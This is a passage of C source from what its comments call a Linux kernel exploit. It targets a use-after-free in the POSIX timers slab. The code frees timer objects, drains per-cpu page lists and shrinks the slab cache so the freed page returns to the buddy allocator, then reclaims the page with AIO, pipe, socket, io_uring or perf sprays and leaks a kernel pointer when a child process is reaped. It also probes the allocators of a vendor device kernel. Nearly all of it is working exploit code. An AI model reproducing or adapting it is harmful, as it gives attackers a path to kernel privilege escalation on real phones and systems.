				i, errno);
			break;
		}
		pool_count++;
	}
	fprintf(stderr, "[reap] pool=%u\n", pool_count);
	ic_slab_stat("pool");
	if (!pool_count) {
		free(pool);
		return -1;
	}

	/* Drop the pre-fork padding; slabs start emptying. */
	(void)ic_delete_slab_padding(padding);
	nanosleep(&grace, NULL);
	ic_slab_stat("padding-drop");

	/* Flush per-cpu page lists.  This raises pcp->free_factor so the
	 * order-1 slab frees below are drained straight to the buddy
	 * allocator instead of lingering on the per-cpu order-1 list. */
	(void)ic_prime_pcp();
	nanosleep(&aio_grace, NULL);
	ic_slab_stat("prime");

	/* Free the pool: the slab that held the victim object is now empty
	 * and gets discarded to the buddy allocator. */
	if (getenv("IC_REVERSE")) {
		for (i = pool_count; i > 0; i--)
			(void)syscall(SYS_timer_delete, pool[i - 1]);
	} else {
		for (i = 0; i < pool_count; i++)
			(void)syscall(SYS_timer_delete, pool[i]);
	}
	free(pool);
	nanosleep(&free_grace, NULL);
	fprintf(stderr, "[reap] pool freed\n");
	ic_slab_stat("pool-free");
	ic_pagetype_stat("pool-free");
	ic_pcp_stat("pool-free");

	if (getenv("IC_SHRINK")) {
		int fd;

		/* Re-prime this CPU's pcp free_factor right before the
		 * synchronous discard: free_unref_page_commit() of the
		 * order-1 slab pages then takes the free_high path and
		 * bulk-drains them to the buddy allocator. */
		(void)ic_prime_pcp();
		ic_pagetype_stat("reprime");
		fd = open("/sys/kernel/slab/posix_timers_cache/shrink",
			  O_WRONLY);

		if (fd >= 0) {
			(void)write(fd, "1\n", 2);
			close(fd);
			fprintf(stderr, "[reap] shrink done\n");
		} else {
			fprintf(stderr, "[reap] shrink open failed errno=%d\n",
				errno);
		}
		ic_slab_stat("shrink");
		ic_pagetype_stat("shrink");
	}

	if (getenv("IC_KICK")) {
		int kick = atoi(getenv("IC_KICK"));
		int *kt = calloc((size_t)kick, sizeof(int));
		int made = 0;

		if (kt) {
			for (i = 0; i < (unsigned int)kick; i++) {
				if (syscall(SYS_timer_create, CLOCK_MONOTONIC,
					    &ev, &kt[i]))
					break;
				made++;
			}
			for (i = 0; i < (unsigned int)made; i++)
				(void)syscall(SYS_timer_delete, kt[i]);
			free(kt);
		}
		nanosleep(&free_grace, NULL);
		fprintf(stderr, "[reap] kick made=%d\n", made);
		ic_slab_stat("kick");
	}

	/* If slab pages are still parked on this CPU's order-1 pcp list
	 * (free_factor decayed during the RCU grace period), the order-2
	 * free burst below raises free_factor and then takes the free_high
	 * path, bulk-draining every pcp list straight to the buddy so the
	 * order-0 pipe allocations can split the freed order-1 slabs. */
	if (ic_skb.queued) {
		if (getenv("IC_PT_FLUSH")) {
			ic_pagetype_stat("pre-flush");
			ic_pcp_stat("pre-flush");
		}
		(void)ic_skb_flush();
		if (getenv("IC_PT_FLUSH")) {
			ic_pagetype_stat("post-flush");
			ic_pcp_stat("post-flush");
		}
	} else {
		(void)ic_prime_pcp();
		ic_pagetype_stat("pre-spray");
	}

	/* Reclaim the freed order-1 slab with unmovable AIO ring pages. */
	if (ic_reap_spray(target, res)) {
		fprintf(stderr, "[reap] spray failed\n");
		return -1;
	}
	fprintf(stderr, "[reap] spray ready pages=%lu\n", res->npages);
	ic_slab_stat("spray");
	ic_pagetype_stat("post-spray");
	ic_pcp_stat("post-spray");

	/* Reap: release_task() -> posix_cpu_timers_exit() -> cleanup_timerqueue
	 * walks the stale node, which now lives in our anon page. */
	if (waitpid(pid, &status, 0) != pid) {
		fprintf(stderr, "[reap] reap failed\n");
		return -1;
	}
	fprintf(stderr, "[reap] reaped status=0x%x\n", status);
	return 0;
}

static void ic_maybe_pin_cpu(void)
{
	const char *env = getenv("IC_CPU");
	int cpu;

	if (!env)
		return;
	cpu = atoi(env);
	if (cpu < 0 || (unsigned int)cpu >= g_cpu_count) {
		fprintf(stderr, "[reap] pin cpu=%d out of range (n=%u)\n", cpu,
			g_cpu_count);
		return;
	}
	ic_pin_cpu_index((unsigned int)cpu);
	fprintf(stderr, "[reap] pinned cpu=%d\n", sched_getcpu());
}

/*
 * Allocator-target probe (root QEMU harness only).
 *
 * The chain needs the order-1 posix_timers_cache slab that the flusher
 * discards to be handed back to a user-mapped allocation.  Which free
 * lists an allocation visits is decided by its gfp migratetype, so this
 * probe allocates one known kernel object at a time and prints the
 * per-zone /proc/pagetypeinfo deltas around it.  Every step is fully
 * released before the next one so the baselines stay comparable.
 */
#define IC_PP_PERF_TYPE_SOFTWARE 1
#define IC_PP_PERF_COUNT_SW_DUMMY 9

struct ic_pp_perf_attr {
	uint32_t type;
	uint32_t size;
	uint64_t config;
	uint64_t sample_period;
	uint64_t sample_type;
	uint64_t read_format;
	uint64_t flags;
	uint32_t wakeup_events;
	uint32_t bp_type;
	uint64_t config1;
	uint64_t config2;
};

static void ic_pp_settle(const char *why)
{
	(void)why;
	usleep(400000);
}

static void ic_pp_anon(void)
{
	const char *e = getenv("IC_PP_ANON");
	unsigned long n = e ? strtoul(e, NULL, 0) : 4096;
	unsigned long i;
	unsigned char *p;

	ic_pagetype_stat("anon-pre");
	if (!n)
		return;
	p = mmap(NULL, n * IC_PAGE, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (p == MAP_FAILED) {
		fprintf(stderr, "[pp] anon mmap failed errno=%d\n", errno);
		return;
	}
	(void)madvise(p, n * IC_PAGE, MADV_NOHUGEPAGE);
	for (i = 0; i < n; i++)
		p[i * IC_PAGE] = 0x5a;
	ic_pagetype_stat("anon-post");
	fprintf(stderr, "[pp] anon pages=%lu\n", n);
	(void)munmap(p, n * IC_PAGE);
	ic_pp_settle("anon");
	ic_pagetype_stat("anon-free");
}

static void ic_pp_pte(void)
{
	const char *e = getenv("IC_PP_PTE");
	unsigned long n = e ? strtoul(e, NULL, 0) : 2048;
	const unsigned long stride = 2UL << 20;
	unsigned long i;
	unsigned char *p;

	ic_pagetype_stat("pte-pre");
	if (!n)
		return;
	p = mmap(NULL, n * stride, PROT_READ,
		 MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
	if (p == MAP_FAILED) {
		fprintf(stderr, "[pp] pte mmap failed errno=%d\n", errno);
		return;
	}
	(void)madvise(p, n * stride, MADV_NOHUGEPAGE);
	{
		const char *se = getenv("IC_PP_STEP");
		unsigned long step = se ? strtoul(se, NULL, 0) : 0;

		/* A read fault on an anonymous private mapping maps the shared
		 * zero page, so the only buddy allocation per stride is the
		 * order-0 UNMOVABLE PTE page.  Snapshotting every step touches
		 * shows exactly which free_area orders the vendor allocator is
		 * willing to split for order-0 requests. */
		for (i = 0; i < n; i++) {
			volatile unsigned char v = p[i * stride];

			(void)v;
			if (step && !((i + 1) % step)) {
				char tag[24];

				snprintf(tag, sizeof(tag), "pte+%lu", i + 1);
				ic_pagetype_stat(tag);
			}
		}
	}
	ic_pagetype_stat("pte-post");
	fprintf(stderr, "[pp] pte touches=%lu\n", n);
	(void)munmap(p, n * stride);
	ic_pp_settle("pte");
	ic_pagetype_stat("pte-free");
}

static void ic_pp_aio(void)
{
	const char *e;
	unsigned long ev = 64, nctx = 1000, i;
	unsigned int made = 0;
	ic_aio_context_t *ctx;

	e = getenv("IC_PP_AIO_EVENTS");
	if (e)
		ev = strtoul(e, NULL, 0);
	e = getenv("IC_PP_AIO_CTXS");
	if (e)
		nctx = strtoul(e, NULL, 0);
	if (!nctx)
		return;
	ctx = calloc(nctx, sizeof(*ctx));
	if (!ctx)
		return;
	ic_pagetype_stat("aio-pre");
	for (i = 0; i < nctx; i++) {
		if (syscall(SYS_io_setup, ev, &ctx[i])) {
			if (!made)
				fprintf(stderr,
					"[pp] aio setup failed errno=%d\n",
					errno);
			break;
		}
		made++;
		(void)*(volatile unsigned char *)(uintptr_t)ctx[i];
	}
	ic_pagetype_stat("aio-post");
	fprintf(stderr, "[pp] aio ev=%lu ctxs=%u\n", ev, made);
	for (i = 0; i < made; i++)
		(void)syscall(SYS_io_destroy, ctx[i]);
	free(ctx);
	ic_pp_settle("aio");
	ic_pagetype_stat("aio-free");
}

static void ic_pp_perf(void)
{
	const char *e;
	unsigned long n = 512, pages = 8, i, p;
	int *fds;
	void **maps;
	size_t len;
	unsigned int made = 0;
	int first_errno = 0;

	e = getenv("IC_PP_PERF_EVENTS");
	if (e)
		n = strtoul(e, NULL, 0);
	e = getenv("IC_PP_PERF_PAGES");
	if (e)
		pages = strtoul(e, NULL, 0);
	if (!n || !pages)
		return;
	fds = calloc(n, sizeof(*fds));
	maps = calloc(n, sizeof(*maps));
	if (!fds || !maps)
		goto out;
	len = (size_t)(pages + 1) * IC_PAGE;
	ic_pagetype_stat("perf-pre");
	for (i = 0; i < n; i++) {
		struct ic_pp_perf_attr attr;
		void *m;
		int fd;

		memset(&attr, 0, sizeof(attr));
		attr.type = IC_PP_PERF_TYPE_SOFTWARE;
		attr.size = sizeof(attr);
		attr.config = IC_PP_PERF_COUNT_SW_DUMMY;
		attr.wakeup_events = 1;
		fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1, -1, 0);
		if (fd < 0) {
			first_errno = errno;
			break;
		}
		m = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
		if (m == MAP_FAILED) {
			first_errno = errno;
			close(fd);
			break;
		}
		/* Data pages (pgoff != 0) are read-only; a write fault there
		 * is turned into VM_FAULT_SIGBUS by perf_mmap_fault. */
		((volatile unsigned char *)m)[0] = 0;
		for (p = 1; p <= pages && p < 4; p++)
			(void)*(volatile unsigned char *)
				((unsigned char *)m + p * IC_PAGE);
		fds[made] = fd;
		maps[made] = m;
		made++;
	}
	ic_pagetype_stat("perf-post");
	fprintf(stderr, "[pp] perf events=%u pages=%lu errno=%d\n", made,
		pages, first_errno);
	for (i = 0; i < made; i++) {
		(void)munmap(maps[i], len);
		close(fds[i]);
	}
	ic_pp_settle("perf");
	ic_pagetype_stat("perf-free");
out:
	free(fds);
	free(maps);
}

static void ic_pp_packet(void)
{
	const char *e;
	unsigned int blocks = 1024;
	unsigned int block_size = 4096;
	struct ic_tpacket_req req;
	int ver = IC_TPACKET_V2;
	int fd;
	void *m;
	size_t len;

	e = getenv("IC_PP_PKT_BLOCKS");
	if (e)
		blocks = (unsigned int)strtoul(e, NULL, 0);
	e = getenv("IC_PP_PKT_BSIZE");
	if (e)
		block_size = (unsigned int)strtoul(e, NULL, 0);
	if (!blocks || !block_size)
		return;
	ic_pagetype_stat("pkt-pre");
	fd = socket(AF_PACKET, SOCK_RAW, 0);
	if (fd < 0) {
		fprintf(stderr, "[pp] packet socket failed errno=%d\n", errno);
		return;
	}
	if (setsockopt(fd, IC_SOL_PACKET, IC_PACKET_VERSION, &ver,
		       sizeof(ver))) {
		fprintf(stderr, "[pp] packet version failed errno=%d\n", errno);
		close(fd);
		return;
	}
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_block_nr = blocks;
	req.tp_frame_size = block_size;
	req.tp_frame_nr = blocks;
	if (setsockopt(fd, IC_SOL_PACKET, IC_PACKET_RX_RING, &req,
		       sizeof(req))) {
		fprintf(stderr, "[pp] packet ring failed errno=%d\n", errno);
		close(fd);
		return;
	}
	len = (size_t)blocks * block_size;
	m = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) {
		fprintf(stderr, "[pp] packet mmap failed errno=%d\n", errno);
		close(fd);
		return;
	}
	ic_pagetype_stat("pkt-post");
	fprintf(stderr, "[pp] packet blocks=%u block_size=%u\n", blocks,
		block_size);
	(void)munmap(m, len);
	close(fd);
	ic_pp_settle("pkt");
	ic_pagetype_stat("pkt-free");
}

static void ic_pp_pipe(void)
{
	const char *e;
	unsigned int np = 512, pg = 8, i, p;
	int (*fds)[2];
	unsigned char page[IC_PAGE];

	memset(page, 0xa5, sizeof(page));
	e = getenv("IC_PP_PIPES");
	if (e)
		np = (unsigned int)strtoul(e, NULL, 0);
	e = getenv("IC_PP_PIPE_PAGES");
	if (e)
		pg = (unsigned int)strtoul(e, NULL, 0);
	if (!np || !pg)
		return;
	fds = calloc(np, sizeof(*fds));
	if (!fds)
		return;
	ic_pagetype_stat("pipe-pre");
	for (i = 0; i < np; i++) {
		if (pipe2(fds[i], O_NONBLOCK))
			break;
		for (p = 0; p < pg; p++)
			(void)write(fds[i][1], page, sizeof(page));
	}
	ic_pagetype_stat("pipe-post");
	fprintf(stderr, "[pp] pipes=%u pages_each=%u\n", i, pg);
	for (p = 0; p < i; p++) {
		close(fds[p][0]);
		close(fds[p][1]);
	}
	free(fds);
	ic_pp_settle("pipe");
	ic_pagetype_stat("pipe-free");
}

/*
 * AF_UNIX SOCK_DGRAM payload probe.  unix_dgram_sendmsg() builds each
 * datagram with __alloc_skb(): kmalloc_reserve(SKB_DATA_ALIGN(len) +
 * SKB_DATA_ALIGN(sizeof(struct skb_shared_info))) picks the kmalloc cache.
 * On 4K pages kmalloc-8k is the order-1 slab, one 8K object per slab, and
 * the object body is the user payload starting at offset 0 (no headroom is
 * reserved for AF_UNIX), so a queued datagram is a user-written order-1
 * UNMOVABLE block: the device-viable replacement for the io_uring ring
 * (app seccomp allows socketpair/send but not io_uring).  Payloads above
 * 7872 spill into kmalloc_large (order-2 page) instead.
 */
static void ic_pp_skb(void)
{
	const char *e;
	unsigned int pairs = 32, per = 64, payload = 7808, step = 0;
	unsigned int i, p, queued = 0;
	int (*fds)[2];
	char *msg;
	int bufsz = 4 * 1024 * 1024;

	e = getenv("IC_PP_SKB_PAIRS");
	if (e)
		pairs = (unsigned int)strtoul(e, NULL, 0);
	e = getenv("IC_PP_SKB_N");
	if (e)
		per = (unsigned int)strtoul(e, NULL, 0);
	e = getenv("IC_PP_SKB_PAYLOAD");
	if (e)
		payload = (unsigned int)strtoul(e, NULL, 0);
	e = getenv("IC_PP_SKB_STEP");
	if (e)
		step = (unsigned int)strtoul(e, NULL, 0);
	if (!pairs || !per || !payload)
		return;
	fds = calloc(pairs, sizeof(*fds));
	msg = malloc(payload);
	if (!fds || !msg) {
		free(fds);
		free(msg);
		return;
	}
	memset(msg, 0x53, payload);
	ic_pagetype_stat("skb-pre");
	for (i = 0; i < pairs; i++) {
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0,
			       fds[i]))
			break;
		(void)setsockopt(fds[i][0], SOL_SOCKET, SO_SNDBUF, &bufsz,
				 sizeof(bufsz));
		(void)setsockopt(fds[i][1], SOL_SOCKET, SO_RCVBUF, &bufsz,
				 sizeof(bufsz));
	}
	pairs = i;
	for (i = 0; i < pairs; i++) {
		for (p = 0; p < per; p++) {
			ssize_t r = send(fds[i][0], msg, payload,
					 MSG_DONTWAIT | MSG_NOSIGNAL);

			if (r != (ssize_t)payload)
				break;
			queued++;
			if (step && !(queued % step)) {
				char tag[24];

				snprintf(tag, sizeof(tag), "skb+%u", queued);
				ic_pagetype_stat(tag);
			}
		}
	}
	ic_pagetype_stat("skb-post");
	fprintf(stderr, "[pp] skb queued=%u pairs=%u payload=%u\n", queued,
		pairs, payload);
	for (i = 0; i < pairs; i++) {
		close(fds[i][0]);
		close(fds[i][1]);
	}
	free(fds);
	free(msg);
	ic_pp_settle("skb");
	ic_pagetype_stat("skb-free");
}

#ifndef IC_SYS_io_uring_setup
#define IC_SYS_io_uring_setup 425
#endif

struct ic_uring_params {
	uint32_t sq_entries;
	uint32_t cq_entries;
	uint32_t flags;
	uint32_t sq_thread_cpu;
	uint32_t sq_thread_idle;
	uint32_t features;
	uint32_t wq_fd;
	uint32_t resv[3];
	uint32_t sq_off[8];
	uint64_t sq_user_addr;
	uint32_t cq_off[8];
	uint64_t cq_user_addr;
};

/*
 * io_uring rings are allocated with __get_free_pages(GFP_KERNEL_ACCOUNT |
 * __GFP_ZERO, get_order(size)): an order-1 (CQ) and order-2 (SQEs) unmovable
 * allocation for the default 256-entry setup, mmap'able from the returned fd.
 * This is the order-1 user-visible reclaim candidate we cannot get from AIO.
 */
static void ic_pp_uring(void)
{
	const char *e;
	unsigned int n = 64, entries = 256, i, made = 0;
	int *fds;
	void **maps;
	size_t *szs;
	int first_errno = 0;

	e = getenv("IC_PP_URING_N");
	if (e)
		n = (unsigned int)strtoul(e, NULL, 0);
	e = getenv("IC_PP_URING_ENTRIES");
	if (e)
		entries = (unsigned int)strtoul(e, NULL, 0);
	if (!n || !entries)
		return;
	fds = calloc(n, sizeof(*fds));
	maps = calloc(n, sizeof(*maps));
	szs = calloc(n, sizeof(*szs));
	if (!fds || !maps || !szs) {
		free(fds);
		free(maps);
		free(szs);
		return;
	}
	ic_pagetype_stat("uring-pre");
	for (i = 0; i < n; i++) {
		struct ic_uring_params p;
		size_t cq_sz;
		void *m;
		int fd;

		memset(&p, 0, sizeof(p));
		fd = (int)syscall(IC_SYS_io_uring_setup, entries, &p);
		if (fd < 0) {
			first_errno = errno;
			break;
		}
		cq_sz = (size_t)p.cq_off[5] + (size_t)p.cq_entries * 16;
		cq_sz = (cq_sz + IC_PAGE - 1) & ~(size_t)(IC_PAGE - 1);
		m = mmap(NULL, cq_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd,
			 0x8000000);
		if (m == MAP_FAILED) {
			fprintf(stderr, "[pp] uring mmap failed errno=%d\n",
				errno);
			close(fd);
			break;
		}
		(void)((volatile unsigned char *)m)[0];
		fds[made] = fd;
		maps[made] = m;
		szs[made] = cq_sz;
		made++;
	}
	ic_pagetype_stat("uring-post");
	fprintf(stderr,
		"[pp] uring n=%u made=%u entries=%u errno=%d\n",
		n, made, entries, first_errno);
	for (i = 0; i < made; i++) {
		munmap(maps[i], szs[i]);
		close(fds[i]);
	}
	ic_pp_settle("uring");
	ic_pagetype_stat("uring-free");
	free(fds);
	free(maps);
	free(szs);
}

/*
 * RSC pool drain probe (root QEMU harness only).
 *
 * The vendor page-allocator hooks serve ordinary allocations out of the
 * RSCIS / RSCIB reserved pools, so the Unmovable buddy lists are never
 * touched while those pools still have free blocks.  This probe allocates
 * IC_DRAIN_PAGES user pages through one page family, snapshots
 * /proc/pagetypeinfo every IC_DRAIN_STEP pages, and prints the first
 * snapshot at which the Unmovable vectors start to fall -- i.e. the point
 * where the vendor bypass stops serving the request and the normal buddy
 * path (which *does* split same-migratetype higher-order blocks) takes over.
 *
 *   IC_DRAIN_MODE=pipe|perf|aio|rsc   (default pipe)
 *   IC_DRAIN_PAGES=<pages>            (default 65536)
 *   IC_DRAIN_STEP=<pages>             (default 4096, 0 disables)
 *   IC_DRAIN_PIPE_PAGES=<1..16>       (default 8)
 */
static int ic_drain_probe(void)
{
	const char *mode = getenv("IC_DRAIN_MODE");
	const char *e;
	unsigned long target = 65536, step = 4096;
	unsigned long done = 0;
	struct rlimit rl;

	if (!mode || !*mode)
		mode = "pipe";
	e = getenv("IC_DRAIN_PAGES");
	if (e)
		target = strtoul(e, NULL, 0);
	e = getenv("IC_DRAIN_STEP");
	if (e)
		step = strtoul(e, NULL, 0);
	if (!target)
		return 0;
	ic_pin_cpu_index(0);
	fprintf(stderr, "[drain] mode=%s target=%lu step=%lu cpu=%d\n", mode,
		target, step, sched_getcpu());
	ic_pagetype_stat("drain-pre");

	if (!strcmp(mode, "rsc")) {
		const char *paths[] = {
			"/proc/vivo_rsc/mem_antifrag",
			"/proc/vivo_rsc/mem_rsc",
			"/proc/vivo_rsc/meminfo",
		};
		unsigned int i;

		for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
			int fd = open(paths[i], O_RDONLY | O_CLOEXEC);
			char buf[2048];
			ssize_t n;

			if (fd < 0) {
				fprintf(stderr, "[drain] %s: errno=%d\n",
					paths[i], errno);
				continue;
			}
			n = read(fd, buf, sizeof(buf) - 1);
			close(fd);
			if (n > 0) {
				buf[n] = '\0';
				fprintf(stderr, "[drain] ==== %s ====\n%s\n",
					paths[i], buf);
			}
		}
	} else if (!strcmp(mode, "pipe")) {
		unsigned int pp = 8;
		unsigned long npipes;
		int (*fds)[2];
		unsigned char *page;
		unsigned long opened = 0, i;
		unsigned int p;

		e = getenv("IC_DRAIN_PIPE_PAGES");
		if (e) {
			unsigned long v = strtoul(e, NULL, 0);

			if (v >= 1 && v <= 16)
				pp = (unsigned int)v;
		}
		npipes = (target + pp - 1) / pp;
		if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
		    rl.rlim_cur < npipes * 2 + 64) {
			rl.rlim_cur = npipes * 2 + 64;
			if (rl.rlim_max < rl.rlim_cur)
				rl.rlim_max = rl.rlim_cur;
			(void)setrlimit(RLIMIT_NOFILE, &rl);
		}
		fds = calloc(npipes, sizeof(*fds));
		page = malloc(IC_PAGE);
		if (!fds || !page) {
			free(fds);
			free(page);
			return 0;
		}
		memset(page, 0x77, IC_PAGE);
		for (i = 0; i < npipes; i++) {
			if (pipe2(fds[i], O_NONBLOCK | O_CLOEXEC))
				break;
			opened++;
		}
		fprintf(stderr, "[drain] pipe opened=%lu/%lu per=%u\n",
			opened, npipes, pp);
		for (i = 0; i < opened && done < target; i++) {
			for (p = 0; p < pp && done < target; p++) {
				ssize_t w = write(fds[i][1], page, IC_PAGE);

				if (w != (ssize_t)IC_PAGE)
					break;
				done++;
				if (step && !(done % step)) {
					char tag[32];

					snprintf(tag, sizeof(tag),
						 "drain+%lu", done);
					ic_pagetype_stat(tag);
				}
			}
		}
		/* Keep every pipe open until after drain-post. */
	} else if (!strcmp(mode, "filp")) {
		/* Pure order-1 slab-page spray: one struct file per open(). */
		unsigned long n = target;
		int *pfds;
		unsigned long i;

		if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
		    rl.rlim_cur < n + 64) {
			rl.rlim_cur = n + 64;
			if (rl.rlim_max < rl.rlim_cur)
				rl.rlim_max = rl.rlim_cur;
			(void)setrlimit(RLIMIT_NOFILE, &rl);
		}
		pfds = calloc(n, sizeof(int));
		if (!pfds)
			return 0;
		for (i = 0; i < n; i++) {
			int fd = open("/init", O_RDONLY | O_CLOEXEC);

			if (fd < 0) {
				fprintf(stderr,
					"[drain] filp stopped at %lu errno=%d\n",
					i, errno);
				break;
			}
			pfds[i] = fd;
			done++;
			if (step && !(done % step)) {
				char tag[32];

				snprintf(tag, sizeof(tag), "drain+%lu", done);
				ic_pagetype_stat(tag);
			}
		}
		fprintf(stderr, "[drain] filp fds=%lu\n", done);
	} else if (!strcmp(mode, "perf")) {
		unsigned long n = target;
		int *pfds;
		void **maps;
		unsigned long i;

		if (getrlimit(RLIMIT_NOFILE, &rl) == 0 &&
		    rl.rlim_cur < n + 64) {
			rl.rlim_cur = n + 64;
			if (rl.rlim_max < rl.rlim_cur)
				rl.rlim_max = rl.rlim_cur;
			(void)setrlimit(RLIMIT_NOFILE, &rl);
		}
		pfds = calloc(n, sizeof(int));
		maps = calloc(n, sizeof(void *));
		if (!pfds || !maps) {
			free(pfds);
			free(maps);
			return 0;
		}
		for (i = 0; i < n; i++) {
			struct ic_pp_perf_attr attr;
			void *m;
			int fd;

			memset(&attr, 0, sizeof(attr));
			attr.type = IC_PP_PERF_TYPE_SOFTWARE;
			attr.size = sizeof(attr);
			attr.config = IC_PP_PERF_COUNT_SW_DUMMY;
			attr.wakeup_events = 1;
			fd = (int)syscall(SYS_perf_event_open, &attr, 0, -1,
					  -1, 0);
			if (fd < 0) {
				fprintf(stderr,
					"[drain] perf stopped at %lu errno=%d\n",
					i, errno);
				break;
			}
			m = mmap(NULL, IC_PAGE, PROT_READ | PROT_WRITE,
				 MAP_SHARED, fd, 0);
			if (m == MAP_FAILED) {
				fprintf(stderr,
					"[drain] perf mmap stopped at %lu errno=%d\n",
					i, errno);
				close(fd);
				break;
			}
			*(volatile unsigned char *)m = 0x5a;
			pfds[i] = fd;
			maps[i] = m;
			done++;
			if (step && !(done % step)) {
				char tag[32];

				snprintf(tag, sizeof(tag), "drain+%lu", done);
				ic_pagetype_stat(tag);
			}
		}
		fprintf(stderr, "[drain] perf events=%lu\n", done);
	} else if (!strcmp(mode, "aio")) {
		unsigned long n = target;
		ic_aio_context_t *ctxs;
		unsigned long i;

		ctxs = calloc(n, sizeof(*ctxs));
		if (!ctxs)
			return 0;
		for (i = 0; i < n; i++) {
			if (syscall(SYS_io_setup, 1, &ctxs[i])) {
				fprintf(stderr,
					"[drain] aio stopped at %lu errno=%d\n",
					i, errno);
				break;
			}
			(void)*(volatile unsigned char *)(uintptr_t)ctxs[i];
			done++;
			if (step && !(done % step)) {
				char tag[32];

				snprintf(tag, sizeof(tag), "drain+%lu", done);
				ic_pagetype_stat(tag);
			}
		}
		fprintf(stderr, "[drain] aio ctxs=%lu\n", done);
	} else {
		fprintf(stderr, "[drain] unknown mode %s\n", mode);
	}

	ic_pagetype_stat("drain-post");
	fprintf(stderr, "[drain] done=%lu\n", done);
	fflush(stderr);
	return 0;
}

static int ic_pageprobe(void)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(0, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);
	fprintf(stderr, "[pp] pagetype probe start\n");
	fflush(stderr);
	ic_pp_anon();
	ic_pp_pte();
	ic_pp_skb();
	ic_pp_aio();
	ic_pp_perf();
	ic_pp_packet();
	ic_pp_pipe();
	ic_pp_uring();
	fprintf(stderr, "[pp] pagetype probe done\n");
	fflush(stderr);
	return 0;
}

static int ic_reap_main(void)
{
	struct ic_reap_result res;
	const char *env = getenv("IC_REAP_TARGET");
	uint64_t target = 0;

	ic_maybe_pin_cpu();
	if (env)
		target = strtoull(env, NULL, 0);

	fprintf(stderr, "[reap] target=0x%llx\n",
		(unsigned long long)target);
	if (ic_reap_attempt(target, &res)) {
		fprintf(stderr, "[reap] attempt failed\n");
		return 1;
	}
	if (!ic_reap_scan(&res)) {
		fprintf(stderr,
			"[reap] LEAK node=0x%llx page=%lu off=0x%x hits=%u\n",
			(unsigned long long)res.leak, res.leak_page,
			res.leak_off, res.hits);
	} else {
		fprintf(stderr, "[reap] no leaked node found\n");
	}
	fflush(stderr);
	ic_skb_cleanup();
	if (ic_reap_use_pipe())
		ic_pipe_cleanup();
	else if (ic_reap_use_unix())
		ic_unx_cleanup();
	else if (ic_reap_use_packet())
		ic_packet_cleanup();
	else if (ic_reap_use_ioring())
		ic_ioring_cleanup();
	else if (ic_reap_use_perf())
		ic_perf_cleanup();
	else
		ic_cleanup_aio_spray(&ic_reap_aio);
	return 0;
}

/* Test harness plumbing: the QEMU initramfs /init hands the exploit a fixed
 * environment, while run_shellboot.sh can only add ic_* words to the kernel
 * command line (world-readable).  A knob only *sets* an env var that
 * nothing else defines, so the delivered behaviour is unchanged unless the
 * harness asks for it. */
static unsigned long ic_cmdline_value(const char *key)
{
	char buf[2048];
	const char *p;
	ssize_t n;
	int fd = open("/proc/cmdline", O_RDONLY | O_CLOEXEC);

	if (fd < 0)
		return 0;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return 0;
	buf[n] = '\0';
	p = strstr(buf, key);
	if (!p)
		return 0;
	return strtoul(p + strlen(key), NULL, 0);
}

/* One line each, so the device log can answer "is CPU0 even inside this
 * process's cpuset?".  The whole peak assumes cpu0's per-cpu freelist and
 * partial list; if the shell domain runs under a cpuset without cpu0 the
 * flusher/pool stage never reuses X's object and pc(X) survives. */
static void ic_env_diag(void)
{
	cpu_set_t orig, got;
	unsigned long long m = 0;
	long ncpu = sysconf(_SC_NPROCESSORS_CONF);
	unsigned long v;
	unsigned int i, n = 0;
	int rc;

	v = ic_cmdline_value("ic_skb_socks=");
	if (v && !getenv("IC_SKB_SOCKS")) {
		char b[24];

		snprintf(b, sizeof(b), "%lu", v);
		setenv("IC_SKB_SOCKS", b, 1);
		fprintf(stderr, "[env] knob IC_SKB_SOCKS=%lu\n", v);
	}
	v = ic_cmdline_value("ic_free_grace_ms=");
	if (v && !getenv("IC_FREE_GRACE")) {
		char b[24];

		snprintf(b, sizeof(b), "%lu", v);
		setenv("IC_FREE_GRACE", b, 1);
		fprintf(stderr, "[env] knob IC_FREE_GRACE=%lums\n", v);
	}
	v = ic_cmdline_value("ic_grace_ms=");
	if (v && !getenv("IC_GRACE_MS")) {
		char b[24];

		snprintf(b, sizeof(b), "%lu", v);
		setenv("IC_GRACE_MS", b, 1);
		fprintf(stderr, "[env] knob IC_GRACE_MS=%lums\n", v);
	}

	CPU_ZERO(&orig);
	if (sched_getaffinity(0, sizeof(orig), &orig)) {
		fprintf(stderr, "[env] ncpu=%ld affinity=? errno=%d\n",
			ncpu, errno);
		return;
	}
	for (i = 0; i < 64; i++)
		if (CPU_ISSET(i, &orig)) {
			m |= 1ULL << i;
			n++;
		}
	fprintf(stderr, "[env] ncpu=%ld allowed=%u mask=0x%llx\n", ncpu, n, m);

	/* Probe CPU0 and put the old mask back: if this process cannot be
	 * pinned there, the peak runs on another cpu's lists entirely. */
	CPU_ZERO(&got);
	CPU_SET(0, &got);
	rc = sched_setaffinity(0, sizeof(got), &got);
	if (rc == 0) {
		CPU_ZERO(&got);
		m = 0;
		if (sched_getaffinity(0, sizeof(got), &got) == 0)
			for (i = 0; i < 64; i++)
				if (CPU_ISSET(i, &got))
					m |= 1ULL << i;
		(void)sched_setaffinity(0, sizeof(orig), &orig);
		fprintf(stderr, "[env] pin0 rc=0 mask=0x%llx\n", m);
	} else {
		fprintf(stderr, "[env] pin0 rc=-1 errno=%d\n", errno);
	}
}

static int ic_is_reexec_image(void)
{
	char buf[4];
	ssize_t n;
	int fd = open("/proc/self/cmdline", O_RDONLY | O_CLOEXEC);

	if (fd < 0)
		return 0;
	n = read(fd, buf, sizeof(buf));
	close(fd);
	return n > 0 && !buf[0];
}

/*
 * IC_RCUTEST=<n>: measure how long timer_delete()'s call_rcu() frees of n
